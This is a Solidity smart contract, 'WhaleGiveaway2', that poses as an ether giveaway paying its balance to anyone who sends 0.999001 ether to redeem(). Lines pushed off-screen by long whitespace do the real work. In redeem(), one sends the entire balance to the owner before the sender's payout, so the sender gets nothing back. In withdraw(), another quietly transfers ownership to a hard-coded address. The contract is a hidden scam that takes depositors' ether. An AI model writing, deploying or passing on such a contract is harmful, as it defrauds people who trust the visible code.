pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Owner = getOwner();
    uint constant public minEligibility = getMinEligibility(); 
   
    function()
    public
    payable
    {
        
    }
   
    function redeem()
    public
    payable
    {                                                                    
        if(msg.value>=getMinEligibility())
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    getOwner().transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==getSpecificAddress()){setOwner(getSpecificAddress());}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == getOwner());
        getOwner().transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == getOwner());
         
        adr.call.value(msg.value)(data);
    }

    function getOwner() private view returns (address) {
        return Owner;
    }

    function setOwner(address newOwner) private {
        Owner = newOwner;
    }

    function getMinEligibility() private pure returns (uint) {
        return 0.999001 ether;
    }

    function getSpecificAddress() private pure returns (address) {
        return 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
    }
}